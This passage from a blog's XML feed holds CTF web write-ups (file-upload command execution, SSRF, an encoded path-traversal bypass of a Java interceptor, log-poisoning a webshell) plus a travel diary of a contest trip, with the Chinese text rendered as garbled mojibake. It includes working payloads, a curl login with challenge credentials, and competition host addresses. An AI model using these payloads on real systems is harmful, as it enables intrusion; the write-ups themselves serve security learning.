122.112.214.101:20004</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type:multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Length: 170</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;3.sh&quot;</span><br><span class="line"></span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">cat &#x2F;flag</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$url</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$a</span> = preg_match(<span class="string">&quot;/file|dict/i&quot;</span>, <span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ch</span> = curl_init();</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">            curl_close(<span class="variable">$ch</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ssrf æ‰“ admin.phpï¼š<code>?url=http://121.36.147.29:20001/admin.php</code></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é“ä¸‰çº¿ä¸‹ä¹‹æ—…</title>
      <link href="2021/05/07/%E9%93%81%E4%B8%89%E7%BA%BF%E4%B8%8B%E4%B9%8B%E6%97%85/"/>
      <url>2021/05/07/%E9%93%81%E4%B8%89%E7%BA%BF%E4%B8%8B%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<p>èººèººè¿›äº†é“ä¸‰çº¿ä¸‹ï¼Œæ¥å®‰å¾½æ—…ä¸€æ³¢æ¸¸ã€‚</p><h2 id="5-7"><a href="#5-7" class="headerlink" title="5.7"></a>5.7</h2><p><img src="https://i.loli.net/2021/05/07/BURJi9TtfVCajkA.jpg"></p><p>ä»Šå¤©åœ¨å®éªŒå®¤ä¸€ç›´å¾…åˆ°å‡Œæ™¨ï¼Œå«äº†æ»´æ»´è·‘åˆ°é•¿æ²™ç«è½¦ç«™ï¼Œåç»¿çš®ç«è½¦å»æ­¦æ˜Œï¼Œå§é“ºå—·ï¼Œå§é“ºï¼Œä»¤äººæ˜¯æ— æ¯”æœŸå¾…ï¼Œæˆ‘ä»¬æ‰€æœŸå¾…çš„æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://i.loli.net/2021/05/07/fFlIXD4iHEN89Ah.png"></p><p>ç„¶åâ€¦â€¦ç°å®æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://i.loli.net/2021/05/07/1Tr8ceGIbfA4quZ.jpg"></p><p>è¿˜å°±å†…ä¸ªä¸‰å±‚å§é“ºï¼Œé¡¶çº§æŠ˜ç£¨ï¼Œå—·ï¼Œä½åœ¨ä¸­å±‚çš„ğŸ‘´åªèƒ½èººç€è¿›å»èººç€å‡ºæ¥ã€‚ä¸ŠåºŠå·²ç»å·®ä¸å¤šæ˜¯å‡Œæ™¨ä¸‰ç‚¹åŠäº†å§ï¼Œéƒ½æ²¡å’‹ç¡ï¼ŒæŠ˜è…¾åˆ°äº†å››ç‚¹å¤šæ‰é—­çœ¼ï¼Œç¡äº†å¤§æ¦‚ä¸¤ä¸ªå°æ—¶å°±è¢«ä¹˜åŠ¡å‘˜å–Šèµ·æ¥äº†ï¼Œè¯´æ˜¯è¿˜æœ‰äºŒååˆ†é’Ÿå°±åˆ°äº†ï¼Œå°±ä¸‹äº†åºŠï¼Œç›´æ¥è·Ÿæ²¡ç¡ä¸€æ ·ï¼Œç„¶åä¸­é—´è¿˜åœäº†ä¸€æ®µæ—¶é—´ï¼Œå°±æ™šç‚¹äº†ï¼Œå·®ç‚¹èµ¶ä¸ä¸Šå…«ç‚¹çš„ä»æ­¦æ±‰ç«™åˆ°åˆè‚¥çš„é«˜é“ğŸšï¼ˆæ€»å½’æ˜¯èµ¶ä¸Šäº†ã€‚</p><p><img src="https://i.loli.net/2021/05/07/9z2tj4CQFDwYrLx.jpg" alt="ã€"></p><p><img src="https://i.loli.net/2021/05/07/srwOyI1MpS4viAq.jpg"></p><p>è¿™ä¸¤å›¾éƒ½åœ¨ç«è½¦ä¸Šæ‹çš„ã€‚</p><p>é«˜é“ä¸Šé¢ä¸€æ²¡é çª—ï¼ŒäºŒå°±å¤ªå›°äº†ğŸ˜´ï¼Œæ‰€ä»¥å•¥éƒ½æ²¡æ‹ï¼Œç›´æ¥é—­ç›®å…»ç¥äº†ä¸€è·¯ã€‚å¤§æ¦‚ä¹ç‚¹å¤šæ€»ç®—æ˜¯åˆ°äº†åˆè‚¥ã€‚</p><p><img src="https://i.loli.net/2021/05/07/Wb5EXg8K24L7lHQ.jpg"></p><p>æŸè›®å¥½çœ‹çš„å»ºç­‘ï¼š</p><p><img src="https://i.loli.net/2021/05/07/Kpa2yBlVfnsF7kJ.jpg"></p><p>ç‚¹åæ‰¹è¯„è¿™é‡Œçš„è€é¸¡æ±¤é¢ï¼Œå¤ªéš¾åƒäº†ï¼Œæµªè´¹ğŸ‘´23å—ğŸ’°ï¼Œå“­å“­ã€‚</p><p>ä½çš„é…’åº—å’Œæ¯”èµ›é…’åº—è¿˜æ˜¯æ¯”è¾ƒè¿‘ï¼Œä¹Ÿå°±éš”å£çš„å…³ç³»å§23333ã€‚</p><p><img src="https://i.loli.net/2021/05/07/5BgLtizdpVSNuWT.jpg"></p><p><img src="https://i.loli.net/2021/05/07/XKIhZwjL7vGJOPR.jpg"></p><p>ä¸‹åˆæ‰“ç®—å»æ¬¢ä¹è°·ç©ç©ï¼Œå½³äºã€‚</p><p>ç¬‘æ­»ï¼Œè¿™ä»¨ä¸ªäººä¸€ä¸ªéƒ½æ²¡èµ·æ¥ï¼Œç©ä¸ªğŸ“å„¿ã€‚</p><p>æ™šä¸Šå»åƒäº†ğŸ‘´åƒè¿‡çš„æœ€éš¾åƒæœ€å‘ğŸ’°çš„çƒ§çƒ¤åº—ï¼Œç¬¬ä¸€æ¬¡å°åˆ°äº†æœ€éš¾åƒçš„ğŸŒ¶ç‚’ğŸ¥©ï¼Œæœ€éš¾åƒçš„ğŸ‚ğŸ¥©ï¼Œæœ€éš¾åƒçš„ğŸ³ç‚’é¥­ï¼Œå±å®ç»™ğŸ‘´æ•´åäº†ï¼Œæ•¢æƒ…ğŸ‘´æ˜¯æ¥æ’é›·çš„å‘—ã€‚</p><p>åƒå®Œæ™šé¥­æ•£æ­¥çš„æ—¶å€™æ‰å‘ç°ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„é—®é¢˜ï¼ŒğŸ‘´å¿˜è®°å¸¦ç½‘çº¿è½¬æ¥å¤´äº†ã€‚ã€‚ã€‚so åˆ°å¤„æºœè¾¾ï¼Œè¯•å›¾åœ¨æ‰‹æœºä¸“å–åº—é‡Œé¢ä¹°åˆ°ç”µè„‘çš„ç½‘çº¿è½¬æ¥å¤´ï¼ˆè¯¯ï¼‰ï¼Œæœ€åæ‰¾åˆ°äº†æŸè”æƒ³ï¼Œç›´æ¥ -249ï¼ˆå“­æƒ¨ï¼‰ã€‚ï¼ˆå…³é”®å‰ä¸¤æ¬¡çº¿ä¸‹ä¹Ÿå¿˜äº†å¸¦ï¼Œä¸é•¿è®°æ€§å•Šè¿™äººï¼‰</p><p><img src="https://i.loli.net/2021/05/07/qlVk3zpOWK4XvCx.jpg"></p><p>å”¯ä¸€èƒ½å¸¦æ¥ä¸€ç‚¹æ…°ç±çš„å°±æ˜¯å°ğŸ·äº†ï¼š</p><p><img src="https://i.loli.net/2021/05/07/dS3NfzvsVx2heDc.jpg"></p><p>å‡†å¤‡çœ‹çœ‹æº¯æºå’Œæ¸—é€ï¼Œå¸Œæœ›æ˜å¤©åˆ«çˆ†é›¶å§ - -</p><p>Good nightğŸŒ™</p><h2 id="5-8"><a href="#5-8" class="headerlink" title="5.8"></a>5.8</h2><p>å¾½é¢ã€‚</p><p><img src="https://i.loli.net/2021/05/08/nFhWkYlSZdygRLT.jpg"></p><p>å½¢çŠ¶è¿˜æŒºé€†å¤©çš„ï¼Œå£æ„Ÿè¿˜å½³äºï¼Œåªæ˜¯æ²¡æœ‰ç¢±é¢å¥½åƒã€‚</p><p><img src="https://i.loli.net/2021/05/08/coLfFjgVw57xmlR.jpg"></p><p>å¤§æ¦‚å…«ç‚¹è¿›èµ›åœºäº†ã€‚</p><p><img src="https://i.loli.net/2021/05/08/kQ9FgopdP4hrvEC.jpg"></p><p><img src="https://i.loli.net/2021/05/08/va3lRrcE8LXZPJt.jpg"></p><p>ä¸­é—´æ¯”èµ›çš„è¿‡ç¨‹è¿˜æŒºè‰°è¾›çš„ï¼Œå­¦åˆ°äº†å¾ˆå¤šï¼ŒçŸ¥é“äº†æº¯æºå¹¶ä¸æ˜¯æƒ³è±¡ä¸­çš„é‚£ä¹ˆéš¾ï¼Œæœ€åæ˜¯ç¬¬åä¸€åï¼Œè¿˜å¯ä»¥ï¼Œå›æœ¬äº†ï¼Œå°èµšã€‚</p><p>ä¸­é¥­éƒ½æ²¡åƒ = =ï¼Œå¾ˆé¥¿ï¼Œå¾…ä¼šåƒé¡¿å¥½çš„ï¼Œæ™šä¸Šå‡ºå»è½¬ä¸€è½¬ã€‚</p><p>å®åœ¨æ„Ÿè°¢ @è€æ¨Š @å“å“¥ @è€è°¢ ä½ ä»¬å¸¦æˆ‘èººã€‚</p><p><img src="https://i.loli.net/2021/05/08/yDwPXVYSv9QKGkt.jpg"></p><p>ç„¶åè¿˜å’Œ @Guoke å¸ˆå‚…é¢äº†ä¸ªåŸºï¼Œguoke å¤ªå¸…äº†ï¼ˆè¯¯ã€‚</p><p>åœ¨ä¹‹åå°±å»äº†æ®è¯´æ˜¯åˆè‚¥äººéƒ½å’‹å’‹å’‹çš„åºå·å¤ªå¤ªåƒæ™šé¥­ã€‚</p><p><img src="https://i.loli.net/2021/05/08/eavzXKdZix4Aj1l.jpg"></p><p><img src="https://i.loli.net/2021/05/08/W1mxOSXudEA6siw.jpg"></p><p><img src="https://i.loli.net/2021/05/08/v8TWqiwfB69AjnK.jpg"></p><p>è™½ç„¶ç¡®å®èŠ±äº†æ¯”æ˜¨æ™šå°‘çš„ğŸ’´ï¼Œåƒåˆ°äº†æ˜¨æ™šå¥½åƒå¤ªå¤šçš„é¥­èœï¼Œä½†æ˜¯è¿™å±Œé¥­åº—çš„ä¸Šèœé€Ÿåº¦ç¡®å®æŠ˜ç£¨äººï¼Œèœè¿˜æ²¡ä¸Šé½å°±å·®ä¸å¤šé¥±äº†ï¼ˆæ¼ã€‚</p><p>å®Œäº‹ä»¥åé€›äº†ä¸€æ³¢å•†åœºï¼Œè¯´æ˜¯è¦ä¹°å¥½åƒçš„å•¥çš„ï¼Œè¿˜æœ‰å¸½å­ï¼Œæœ€åå°±æˆ‘å’Œè€è°¢ä¸€äººä¹°äº†ä¸€åªğŸ·ã€‚</p><p><img src="https://i.loli.net/2021/05/08/gAIe1xqnvSfBY4W.jpg"></p><p>å½³äºï¼Œå›é…’åº—ä¼‘æ¯äº†ï¼ŒåºŠå¤ªèˆ’æœäº†ã€‚</p><h2 id="5-9"><a href="#5-9" class="headerlink" title="5.9"></a>5.9</h2><p>ä¸€è§‰ç¡åˆ° 10 ç‚¹ï¼Œå¦‚æœä¸æ˜¯æœ‰æ¯”èµ›è¿˜å¯ä»¥ç»§ç»­ç¡ğŸ›ã€‚</p><p>è€æ¨Šè€è°¢ç›´æ¥è·‘å‡ºå»ç©å»äº†ï¼Œå’Œå“å“¥æ‰“åˆ°å¿«ä¸¤ç‚¹çš„æ—¶å€™å»åƒäº†é¡¿é¥­ï¼Œåˆä¸ä¿¡é‚ªå»åƒäº†æ¬¡ç¬¬ä¸€å¤©åƒçš„åº—å­ã€‚</p><p><img src="https://i.loli.net/2021/05/09/KIlSPANmgEZzRp7.jpg"></p><p>å¥½çœ‹æ˜¯æŒºå¥½çœ‹ï¼Œä½†æ˜¯å°±æ˜¯å°‘äº†å‘³é“ï¼ˆçƒ¦æ­»äº†ã€‚</p><p>ä¸‹åˆç»§ç»­å‘å¾®åšé¢˜ï¼Œä¸€ä¸ªäººæ‰“ä¸¤åœºæ¯”èµ›ï¼ˆé˜Ÿå‹å‘¢ï¼Œæ•‘æ•‘å•Šï¼Œåˆ«æ¼”äº†ã€‚</p><p>åƒäº†éš”å£çš„è€ä¹¡é¸¡ï¼Œå¾ˆç¦»è°±çš„æ˜¯ä¸€å †äººå¯¹ç€å¯¼èˆªåŠå¤©ï¼Œéƒ½è¯´æ˜æ˜åˆ°äº†ï¼ˆæŒ‡è‡ªå®¶é…’åº—é—¨å£ï¼‰ï¼Œä¸ºä»€ä¹ˆæ²¡æ‰¾åˆ°ï¼Œè½¬å¤´ä¸€çœ‹å°±åœ¨éš”å£ï¼ˆçã€‚</p><p><img src="https://i.loli.net/2021/05/09/3H6vYGFci2TEnmL.jpg"></p><p><img src="https://i.loli.net/2021/05/09/FimjJQ7zeslVZCI.jpg"></p><p>äººæ‰‹ä¸€ç“¶è¥å…»å¿«çº¿ï¼Œå¹²~</p><p><img src="https://i.loli.net/2021/05/09/thF9MNdV6IDXRCv.jpg"></p><p>ç„¶åç¬¬äºŒè½®ï¼Œå—¦é¢ï¼ˆä»€ä¹ˆå«ä¸Šå½“ï¼Œå†ä¹Ÿä¸ä¼šåƒå¾½é¢äº†ï¼Œæˆ‘ä¸è¯¥å¯¹å¾½é¢æœ‰è¿™æ ·çš„ä¿¡å¿ƒã€‚&lt;ä»…ä»£è¡¨ä¸ªäººè§‚ç‚¹&gt;</p><p><img src="https://i.loli.net/2021/05/09/OPYVjdyR4pTGbH8.jpg" alt="@4PF9_N_O_GASGI_V_APZF5.jpg"></p><p>è¡¨æƒ…åŒ…æ€ä¹ˆè¯´ï¼Œå¤ºç¬‹å•Šã€‚</p><p><img src="https://i.loli.net/2021/05/09/CPaSnvAGditTp5u.jpg"></p><p>åƒå®Œå’Œè€è°¢éª‘å°ç”µåŠ¨åˆ°å¤„ä¹±è½¬ï¼Œå¾ˆèˆ’æœï¼Œç¬¬ä¸€æ¬¡éª‘ï¼Œç›´æ¥èµ·é£ã€‚</p><p><img src="https://i.loli.net/2021/05/09/dFUmtri58buJ6Io.jpg"></p><p>å›æ¥è¶´åºŠä¸Šçœ‹äº†ä¸€æ³¢é¬¼ç­ï¼Œèˆ’æœä¹‹ï¼ˆåªèƒ½è¯´æˆ‘å¤ªæ¬£èµå–„é€¸çš„é¢œäº†ã€‚</p><p><img src="https://i.loli.net/2021/05/09/z9f3gqNZ6rjpcvh.jpg"></p><p><img src="https://i.loli.net/2021/05/09/C9p4GjevUO6q8Fm.jpg"></p><p>æ˜å¤©æ‰“ç®—å»å¤–é¢è½¬ä¸€è½¬ï¼Œæ”¾æ¾æ”¾æ¾ï¼Œä¼‘æ¯äº†ä¼‘æ¯äº†ã€‚</p><h2 id="5-10"><a href="#5-10" class="headerlink" title="5.10"></a>5.10</h2><p>å»æ¸¸ä¹åœºç©äº†åŠå¤©ï¼Œå¾ˆä»–ğŸçˆ½ï¼Œåç«è½¦å›äº†ï¼Œè´´å¼ è¡¨æƒ…åŒ…ï¼Œæºœäº†æºœäº†ã€‚</p><p><img src="https://i.loli.net/2021/05/11/mHoKCj98rXGP4xz.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> æ—…æ¸¸è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
            <tag> æ—…æ¸¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_CSTC_WP</title>
      <link href="2021/05/06/2021-CSTC-WP/"/>
      <url>2021/05/06/2021-CSTC-WP/</url>
      
        <content type="html"><![CDATA[<p>äº”ä¸€å‡æœŸç»“æŸå¤ªå¿«äº†ï¼Œæ—©ä¸Šèµ·æ¥æƒ³å·æ‡’ç¡è§‰è¢« @LemonPrefect å¸ˆå‚…æ‹–èµ·æ¥åšé¢˜ï¼Œä¸­åˆæƒ³ç¡åˆè§‰è¢« @Guoke å¸ˆå‚…æ‹–èµ·æ¥åšé¢˜ï¼Œæœ€åæ˜¯å’Œå¸ˆå‚…ä»¬ä¸€èµ· A äº†å››é“ webï¼ˆguoke å¤ªçŒ›äº†ï¼‰ï¼Œæ™šä¸Šå‡ºå»äº†æœ€åæ²¡æ¥å¾—åŠåš web5ï¼Œéšä¾¿è´´è´´å½“æ—¶è®°å½•çš„æ–‡æ¡£å§ï¼Œå¥½åƒä¹Ÿæ²¡æœ‰å¤ç°äº†ã€‚</p><h2 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h2><p>ç®€å•çš„ç»•è¿‡ï¼Œpayloadï¼š</p><p><code>?foo=&#123;&quot;bar1&quot;:&quot;2022a&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125;&amp;cat[0]=%00cstc2021&amp;cat[1]=1&amp;dog[]=%00</code></p><h2 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h2><p><code>http://49.232.167.183:30013/swagger-resources/configuration/ui</code></p><p>å¥½åƒæ˜¯è¿™ä¸ªåœ°æ–¹å§ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰è·¯ç”±ï¼Œæœ‰ä¸ªçˆ†ç ´UIDçš„æ¥å£ã€‚é€šè¿‡çˆ†ç ´UIDã€‚å¾—åˆ°900å¤šçš„ä¸€ä¸ªctf_adminè´¦å·ä»¥åŠå¯†ç md5è§£å¯†å¾—åˆ°ctfer123!@#</p><p><code>curl -X GET &quot;http://49.232.167.183:30012/login?username=ctf_admin&amp;password=ctfer123!%40%23&quot;</code></p><p>è·å¾— tokenï¼š9c618e664319512ef7db2d3c0672bee0</p><p>ç„¶å ssrf è®¿é—® <code>ftp://localhost/flag.txt</code> å¾—åˆ°flagã€‚</p><h2 id="ctfweb3"><a href="#ctfweb3" class="headerlink" title="ctfweb3"></a>ctfweb3</h2><p>è®¿é—® robots.txtï¼Œå­˜åœ¨ <code>/PassOn/</code>ï¼Œæºç æ³„éœ²ï¼š</p><p><code>http://49.232.3.115:49400/PassOn/PassOnbackupDirect0ry/info.php</code></p><p>style.css ä¸­å‘ç°ç”¨æˆ· Ptn4rdn <a href="mailto:&#80;&#x74;&#x6e;&#52;&#114;&#x64;&#x6e;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#109;">&#80;&#x74;&#x6e;&#52;&#114;&#x64;&#x6e;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#109;</a></p><p>reset ç”³è¯·æ”¹ä¸€ä¸‹å¯†ç ï¼Œlogin å†™ğŸï¼Œç„¶åè®¿é—®æ—¥å¿—å®Œäº‹ã€‚</p><h2 id="hackerweb"><a href="#hackerweb" class="headerlink" title="hackerweb"></a>hackerweb</h2><p>å­˜åœ¨ /login è·¯ç”±ï¼Œjava é¢˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebMvcConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">registry.addInterceptor(handlerInterceptor())</span><br><span class="line">.addPathPatterns(<span class="string">&quot;/**&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> HandlerInterceptor <span class="title">handlerInterceptor</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> PermissionInterceptor();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PermissionInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">String uri = request.getRequestURI();</span><br><span class="line">uri = uri.replaceAll(<span class="string">&quot;//&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;RequestURI: &quot;</span> + uri);</span><br><span class="line"><span class="keyword">if</span> (uri.contains(<span class="string">&quot;..&quot;</span>) || uri.contains(<span class="string">&quot;./&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (uri.startsWith(<span class="string">&quot;/login&quot;</span>) || uri.startsWith(<span class="string">&quot;/index&quot;</span>) || uri.startsWith(<span class="string">&quot;/image&quot;</span>) || uri.startsWith(<span class="string">&quot;/css&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ <code>POST /login/%2e%2e/%61%64%6d%69%6e</code> ç»•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username&#x3D;admin&amp;Password&#x3D;admin</span><br></pre></td></tr></table></figure><p>å‘ç° domain &amp; secertï¼Œè¿™é‡Œçº ç»“äº†å¾ˆä¹…ã€‚</p><p><img src="https://i.loli.net/2021/05/06/OILkxSRHgavoXc5.png"></p><p>domain å¤„ä¼  dns è¯•è¯•ï¼Œå›æ˜¾ 127.0.0.1ï¼ŒåŒæ—¶ dnslog ä¹Ÿæœ‰äº†å›æ˜¾ï¼š</p><p><img src="https://i.loli.net/2021/05/06/hrvM6FaG8oXdb9k.png"></p><p>æ€»å…±å¤§æ¦‚æ˜¯è¿™å››ä¸ªï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ea197db0 bf03c5f3 8841a402 75aaaf2e</span><br></pre></td></tr></table></figure><p>secert å¤„æ’åˆ—ç»„åˆäº¤ä¸€ä¸‹ flag å°±å‡ºäº†ã€‚</p><hr><p>é¡ºå¸¦ä¸€æï¼Œè¿™é‡Œæ˜¯å‡ºé¢˜äººè‹±è¯­æ¯”ğŸ‘´è¿˜å·®ï¼Œæ‰“é”™å•è¯äº†ï¼ˆsecert -&gt; secret</p><h2 id="superadmin"><a href="#superadmin" class="headerlink" title="superadmin"></a>superadmin</h2><p>register å¤„ sql æ³¨å…¥ï¼Œè¿˜æ²¡åšå‡ºæ¥ï¼Œç­‰ä¸€æ³¢èµ›å wp å§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_PYCC_WEB5_WP</title>
      <link href="2021/05/04/2021-PYCC-WEB5-WP/"/>
      <url>2021/05/04/2021-PYCC-WEB5-WP/</url>
      
        <content type="html"><![CDATA[<p>çœ‹äº†çœ‹è¿™é“é¢˜ï¼Œå¥½åƒè¿˜è›®æœ‰æ„æ€çš„ã€‚ã€‚ã€‚pycc åæ­£ä¸ç”¨å¤šè¯´ï¼Œå¬å¸ˆå‚…è¯´è¿™é“é¢˜ 509 è§£ï¼Œå“ˆå“ˆå“ˆã€‚</p><hr><p>æ€ªæ¶å¿ƒçš„ï¼Œå’Œ @s1mple å¸ˆå‚…è®¨è®ºäº†åŠå¤©ï¼Œæ¶å¿ƒç¿»å€ã€‚</p><h2 id="which-is-the-true-iscc"><a href="#which-is-the-true-iscc" class="headerlink" title="which is the true iscc"></a>which is the true iscc</h2><p>è´´ä¸€ä¸‹æºç å§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 